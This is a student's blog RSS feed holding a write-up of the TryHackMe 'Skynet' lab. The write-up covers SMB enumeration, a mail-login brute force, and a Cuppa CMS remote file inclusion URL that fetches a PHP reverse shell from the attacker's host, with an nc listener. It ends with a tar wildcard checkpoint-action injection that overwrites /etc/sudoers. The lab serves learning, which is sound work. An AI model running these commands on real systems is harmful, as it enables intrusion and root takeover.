@@ -1,0 +1,366 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Hekethys - Website</title><link>https://hekethys.github.io/web/</link><description>Recent content on Hekethys - Website</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 18 May 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://hekethys.github.io/web/index.xml" rel="self" type="application/rss+xml"/><item><title>Skynet</title><link>https://hekethys.github.io/web/p/tryhackme/</link><pubDate>Thu, 18 May 2023 00:00:00 +0000</pubDate><guid>https://hekethys.github.io/web/p/tryhackme/</guid><description>&lt;img src="https://hekethys.github.io/web/p/tryhackme/assets/skynet.jpeg" alt="Featured image of post Skynet" />&lt;p>&lt;a class="link" href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener"
+>Link to the machine&lt;/a>&lt;/p>
+&lt;h2 id="Answer-1">Answer 1&lt;/h2>
+&lt;p>My target IP : &lt;strong>10.10.84.89&lt;/strong>&lt;/p>
+&lt;p>We start by simply launching an nmap scan.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="l">nmap -sC -sV -oN nmap -O -T4 [@Target_IP]&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/1.PNG"
+width="749"
+height="386"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/1_hu7db0485bf4f88bac2266fef57965a8bc_275461_480x0_resize_box_3.PNG 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/1_hu7db0485bf4f88bac2266fef57965a8bc_275461_1024x0_resize_box_3.PNG 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="194"
+data-flex-basis="465px"
+>&lt;/p>
+&lt;p>We can see that 6 services are open, including port 80. We navigate to a web browser to see what it is.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/2.png"
+width="1476"
+height="961"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/2_hu7a6f6b61b5de32d8829fe11025884cfb_195510_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/2_hu7a6f6b61b5de32d8829fe11025884cfb_195510_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="153"
+data-flex-basis="368px"
+>&lt;/p>
+&lt;p>We launch gobuster to discover hidden files or directories.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/3.png"
+width="1489"
+height="897"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/3_hu07adcd200df30982cacf569fdebc6921_737938_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/3_hu07adcd200df30982cacf569fdebc6921_737938_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="165"
+data-flex-basis="398px"
+>&lt;/p>
+&lt;p>The &amp;ldquo;admin&amp;rdquo; directory is forbidden, so we focus on the &amp;ldquo;squirrelmail&amp;rdquo; directory.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/4.png"
+width="1494"
+height="864"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/4_hu2a46046c8b240a75d9a4de7287c38f02_425676_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/4_hu2a46046c8b240a75d9a4de7287c38f02_425676_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="172"
+data-flex-basis="415px"
+>&lt;/p>
+&lt;p>We could attempt a brute force attack, but for now, I prefer to revisit the information provided by nmap, which indicates the presence of a Samba share. To exploit it, we can use the tool &amp;ldquo;enum4linux.&amp;rdquo;&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="l">enum4linux 10.10.84.89&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/5.png"
+width="1504"
+height="913"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/5_hu6257b96b868bf6c566047e7ca88af0c5_606814_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/5_hu6257b96b868bf6c566047e7ca88af0c5_606814_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 5"
+class="gallery-image"
+data-flex-grow="164"
+data-flex-basis="395px"
+>&lt;/p>
+&lt;p>Bingo! We learn two things: anonymous account usage is allowed, and there is also a share named &amp;ldquo;&lt;strong>milesdyson&lt;/strong>.&amp;rdquo;&lt;/p>
+&lt;p>Let&amp;rsquo;s connect anonymously and download the content of the &amp;ldquo;milesdyson&amp;rdquo; share.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/6.png"
+width="1504"
+height="478"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/6_hu59a8e94b014341001731604cd3837cf4_353434_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/6_hu59a8e94b014341001731604cd3837cf4_353434_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="314"
+data-flex-basis="755px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/7.png"
+width="1507"
+height="88"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/7_huaea1ccb5ec3e4947fce0ba40e6eb6498_97209_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/7_huaea1ccb5ec3e4947fce0ba40e6eb6498_97209_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 7"
+class="gallery-image"
+data-flex-grow="1712"
+data-flex-basis="4110px"
+>&lt;/p>
+&lt;p>We find that &amp;ldquo;log1.txt&amp;rdquo; is a password list.&lt;/p>
+&lt;p>At this stage, we have a list of passwords and a possible username: milesdyson. We try to connect to the mail server using the passwords from this list and the username milesdyson. Success! It was quite fast.&lt;/p>
+&lt;h2 id="Answer-2">Answer 2&lt;/h2>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/8.png"
+width="1507"
+height="814"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/8_hu82ab607eddc8801f3e41dd6e1bfd97fa_525993_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/8_hu82ab607eddc8801f3e41dd6e1bfd97fa_525993_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="185"
+data-flex-basis="444px"
+>&lt;/p>
+&lt;p>In one of the emails, we find the new password for this user, allowing us to connect to their share.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/9.png"
+width="1504"
+height="457"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/9_hubbc138ecd388de917ea60748b999f488_476364_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/9_hubbc138ecd388de917ea60748b999f488_476364_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 9"
+class="gallery-image"
+data-flex-grow="329"
+data-flex-basis="789px"
+>&lt;/p>
+&lt;p>In the &amp;ldquo;notes&amp;rdquo; directory, we find the file &amp;ldquo;important.txt.&amp;rdquo;&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/10.png"
+width="1413"
+height="396"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/10_huf491fd215bfc38f77e7bab6a2ce3af39_280699_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/10_huf491fd215bfc38f77e7bab6a2ce3af39_280699_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 10"
+class="gallery-image"
+data-flex-grow="356"
+data-flex-basis="856px"
+>&lt;/p>
+&lt;p>The document mentions a CMS. Let&amp;rsquo;s see how it looks in the browser.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/11.png"
+width="937"
+height="841"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/11_huaaa44fa23402fa0a2f2ebf69ba7dc25e_389370_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/11_huaaa44fa23402fa0a2f2ebf69ba7dc25e_389370_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 11"
+class="gallery-image"
+data-flex-grow="111"
+data-flex-basis="267px"
+>&lt;/p>
+&lt;p>Here is our hidden directory.&lt;/p>
+&lt;h2 id="Answer-3">Answer 3&lt;/h2>
+&lt;p>Not knowing what to do at this stage, I relaunch gobuster on this new address.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/12.png"
+width="1506"
+height="505"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/12_huf1177f3c73e85d1fdeca4b30762b1ec3_353454_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/12_huf1177f3c73e85d1fdeca4b30762b1ec3_353454_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 12"
+class="gallery-image"
+data-flex-grow="298"
+data-flex-basis="715px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/13.png"
+width="1504"
+height="1083"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/13_huc5a986d225282ac9debea6e39a500fee_525067_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/13_huc5a986d225282ac9debea6e39a500fee_525067_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 13"
+class="gallery-image"
+data-flex-grow="138"
+data-flex-basis="333px"
+>&lt;/p>
+&lt;p>We get something called Cuppa CMS.
+Let&amp;rsquo;s search if there is a known vulnerability.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/14.png"
+width="1504"
+height="219"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/14_huf99d0a84837ee0d077ab83610b17613e_192203_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/14_huf99d0a84837ee0d077ab83610b17613e_192203_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 14"
+class="gallery-image"
+data-flex-grow="686"
+data-flex-basis="1648px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/15.png"
+width="1504"
+height="271"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/15_hu5992d78b090696510534f02ba5742a5d_236272_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/15_hu5992d78b090696510534f02ba5742a5d_236272_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 15"
+class="gallery-image"
+data-flex-grow="554"
+data-flex-basis="1331px"
+>&lt;/p>
+&lt;blockquote>
+&lt;p>Remote File Inclusion, let&amp;rsquo;s try to inject a reverse shell.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="Answer-4">Answer 4&lt;/h2>
+&lt;p>I&amp;rsquo;ll use the one from &lt;a class="link" href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener"
+>pentestmonkey&lt;/a>.&lt;/p>
+&lt;p>My target IP : &lt;strong>10.10.220.244&lt;/strong>&lt;/p>
+&lt;p>Remember to modify the address in the script with your own machine&amp;rsquo;s :&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/16.png"
+width="1306"
+height="586"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/16_hu89a12f3bd7245c01918d7b5a32f46415_358692_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/16_hu89a12f3bd7245c01918d7b5a32f46415_358692_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 16"
+class="gallery-image"
+data-flex-grow="222"
+data-flex-basis="534px"
+>&lt;/p>
+&lt;p>In one terminal, we start the Python server where our script is located.&lt;/p>
+&lt;p>In another terminal, we listen on port 1234 (if you haven&amp;rsquo;t changed it):&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="l">nc -lvnp 1234&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>So in a shell :&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/17.png"
+width="858"
+height="306"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/17_hu0858b9d13ae12fd458d67df5fac229b0_104924_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/17_hu0858b9d13ae12fd458d67df5fac229b0_104924_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 17"
+class="gallery-image"
+data-flex-grow="280"
+data-flex-basis="672px"
+>&lt;/p>
+&lt;p>And in another :&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/18.png"
+width="1506"
+height="240"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/18_hu34bb2964e06230a9e816f43cc04ee78a_186453_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/18_hu34bb2964e06230a9e816f43cc04ee78a_186453_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 18"
+class="gallery-image"
+data-flex-grow="627"
+data-flex-basis="1506px"
+>&lt;/p>
+&lt;p>Then, in the web browser:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="l">http://10.10.84.89/[NAME OF HIDDEN DIRECTORY]/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.220.244:8000/php-reverse-shell.php&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/19.png"
+width="1504"
+height="325"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/19_hua339b01ac35eb5c7b5b46c5e24aa5770_323244_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/19_hua339b01ac35eb5c7b5b46c5e24aa5770_323244_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 19"
+class="gallery-image"
+data-flex-grow="462"
+data-flex-basis="1110px"
+>&lt;/p>
+&lt;p>The reverse shell is in place!&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/20.png"
+width="1507"
+height="145"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/20_huc9181776a5aa40df6e5f4dc5f6a2e596_153068_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/20_huc9181776a5aa40df6e5f4dc5f6a2e596_153068_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 20"
+class="gallery-image"
+data-flex-grow="1039"
+data-flex-basis="2494px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/21.png"
+width="1504"
+height="202"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/21_huc218264216c80747bff187931a6f89cc_166537_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/21_huc218264216c80747bff187931a6f89cc_166537_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 21"
+class="gallery-image"
+data-flex-grow="744"
+data-flex-basis="1786px"
+>&lt;/p>
+&lt;h2 id="Answer-5">Answer 5&lt;/h2>
+&lt;p>Now it&amp;rsquo;s time to escalate privileges.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/22.png"
+width="1501"
+height="313"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/22_huc95fc5e9b75d22a02cd578873e9387dd_176735_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/22_huc95fc5e9b75d22a02cd578873e9387dd_176735_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 22"
+class="gallery-image"
+data-flex-grow="479"
+data-flex-basis="1150px"
+>&lt;/p>
+&lt;p>I can&amp;rsquo;t use the &amp;ldquo;sudo -l&amp;rdquo; command, so I decide to take a look at the crontab, and there we find an interesting file.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/23.png"
+width="1506"
+height="739"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/23_hu314481e95ccf99af1dd5482f7a2a1529_793698_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/23_hu314481e95ccf99af1dd5482f7a2a1529_793698_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 23"
+class="gallery-image"
+data-flex-grow="203"
+data-flex-basis="489px"
+>&lt;/p>
+&lt;p>I&amp;rsquo;ll check &lt;a class="link" href="https://gtfobins.github.io/gtfobins/tar/" target="_blank" rel="noopener"
+>GTFOBins&lt;/a> to see if we can do something with that &amp;ldquo;tar&amp;rdquo; command executed as root.&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/24.png"
+width="1291"
+height="418"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/24_hu840ced357741f31b6215d6c836a960a8_36231_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/24_hu840ced357741f31b6215d6c836a960a8_36231_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 24"
+class="gallery-image"
+data-flex-grow="308"
+data-flex-basis="741px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="line">&lt;span class="cl">&lt;span class="l">echo &amp;#39;echo &amp;#34;www-data ALL=(root) NOPASSWD: ALL&amp;#34; &amp;gt; /etc/sudoers&amp;#39; &amp;gt; privesc.sh&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="l">echo &amp;#34;/var/www/html&amp;#34; &amp;gt; &amp;#34;--checkpoint-action=exec=sh privesc.sh&amp;#34;&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="l">echo &amp;#34;/var/www/html&amp;#34; &amp;gt; --checkpoint=1&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/25.png"
+width="1504"
+height="238"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/25_hu496d962fbf8f5185c0d925b387f28f4a_192622_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/25_hu496d962fbf8f5185c0d925b387f28f4a_192622_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 25"
+class="gallery-image"
+data-flex-grow="631"
+data-flex-basis="1516px"
+>&lt;/p>
+&lt;p>After 1 minute :&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/26.png"
+width="1503"
+height="226"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/26_hu3f923f3efc6b42fcb5592764064f1513_196802_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/26_hu3f923f3efc6b42fcb5592764064f1513_196802_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 26"
+class="gallery-image"
+data-flex-grow="665"
+data-flex-basis="1596px"
+>&lt;/p>
+&lt;p>&lt;img src="https://hekethys.github.io/web/web/p/tryhackme/assets/27.png"
+width="1501"
+height="198"
+srcset="https://hekethys.github.io/web/web/p/tryhackme/assets/27_hu1f1aa0d11c0eea183558fc76f8539ff8_159390_480x0_resize_box_3.png 480w, https://hekethys.github.io/web/web/p/tryhackme/assets/27_hu1f1aa0d11c0eea183558fc76f8539ff8_159390_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Image 27"
+class="gallery-image"
+data-flex-grow="758"
+data-flex-basis="1819px"
+>&lt;/p></description></item><item><title>About</title><link>https://hekethys.github.io/web/about/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://hekethys.github.io/web/about/</guid><description>&lt;img src="https://hekethys.github.io/tryhackme/skynet/1.PNG" alt="Featured image of post About" />&lt;p>Hello, I&amp;rsquo;m Heke a cybersecurity student.&lt;/p>
+&lt;p>I&amp;rsquo;m currently a student at the &lt;strong>Aix-Marseille University Institute of Technology&lt;/strong> and I will start an apprenticeship at &lt;strong>ESIEA&lt;/strong> in September 💻&lt;/p></description></item><item><title>Archives</title><link>https://hekethys.github.io/web/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://hekethys.github.io/web/archives/</guid><description/></item><item><title>Hello World</title><link>https://hekethys.github.io/web/p/hello-world/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://hekethys.github.io/web/p/hello-world/</guid><description>&lt;img src="https://hekethys.github.io/web/p/hello-world/cover.jpg" alt="Featured image of post Hello World" />&lt;p>Welcome to Hugo theme Stack. This is your first post. Edit or delete it, then start writing!&lt;/p>
+&lt;p>For more information about this theme, check the documentation: &lt;a class="link" href="https://docs.stack.jimmycai.com/" target="_blank" rel="noopener"
+>https://docs.stack.jimmycai.com/&lt;/a>&lt;/p>
+&lt;p>Want a site like this? Check out &lt;a class="link" href="https://github.com/CaiJimmy/hugo-theme-stack-starter" target="_blank" rel="noopener"
+>hugo-theme-stack-stater&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>Photo by &lt;a class="link" href="https://unsplash.com/@pawel_czerwinski" target="_blank" rel="noopener"
+>Pawel Czerwinski&lt;/a> on &lt;a class="link" href="https://unsplash.com/" target="_blank" rel="noopener"
+>Unsplash&lt;/a>&lt;/p>
+&lt;/blockquote></description></item><item><title>Links</title><link>https://hekethys.github.io/web/links/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://hekethys.github.io/web/links/</guid><description>&lt;script src="https://tryhackme.com/badge/1916845">&lt;/script></description></item><item><title>Search</title><link>https://hekethys.github.io/web/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://hekethys.github.io/web/search/</guid><description/></item></channel></rss>
